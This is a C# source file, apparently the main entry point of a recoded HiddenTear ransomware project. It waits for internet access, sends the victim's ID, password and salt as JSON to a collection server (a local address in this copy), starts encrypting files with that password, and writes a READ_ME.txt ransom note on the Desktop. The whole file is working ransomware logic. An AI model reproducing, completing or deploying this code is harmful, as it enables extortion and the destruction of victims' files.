using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Text.Json;

namespace hiddentearrecoded
{
    static class Program
    {
        static string MessagePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_ME.txt";
        static string BytesFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\bytes.file";
        static string URL = "http://127.0.0.1:3001/";

#if DEBUG
        public static bool DebugMode = true;
#else
        public static bool DebugMode = false;
#endif

        [STAThread]
        static void Main()
        {
            if (File.Exists(BytesFilePath))
            {
                Application.Exit();
            }

            //If there's no internet use local stored key maybe
            bool Internet;
            do
            {
                Internet = Utils.CheckForInternetConnection();
                if (Internet == false)
                    Thread.Sleep(5000);
            } while (Internet == false);

            var salt = UserDetails.details.SaltBytes;
            string json = JsonSerializer.Serialize(UserDetails.details);
            Console.WriteLine(json);
            Upload.PostJson(URL, json);

            Encryption.StartEncryption(UserDetails.details.Password, salt);

            CreateMessage();
        }

        static void CreateMessage()
        {
            if (File.Exists(MessagePath) == false)
            {
                //Also write user's id or something
                string[] lines = { $"Your unique ID is {UserDetails.details.ID}", "Line1", "Line2" };
                File.WriteAllLines(MessagePath, lines);
            }
        }
    }
}
